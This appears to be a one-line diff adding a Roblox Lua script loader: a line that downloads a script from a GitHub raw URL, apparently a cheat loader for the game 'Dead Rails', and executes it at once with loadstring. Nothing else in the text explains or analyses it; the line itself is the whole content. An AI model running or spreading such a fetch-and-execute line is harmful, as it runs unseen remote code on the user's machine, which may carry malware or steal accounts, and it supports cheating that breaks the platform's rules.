@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/highwaymarevibrate/loaders/main/loaders/dead-rails-spam1-s7nexiqgghkugl.lua"))()
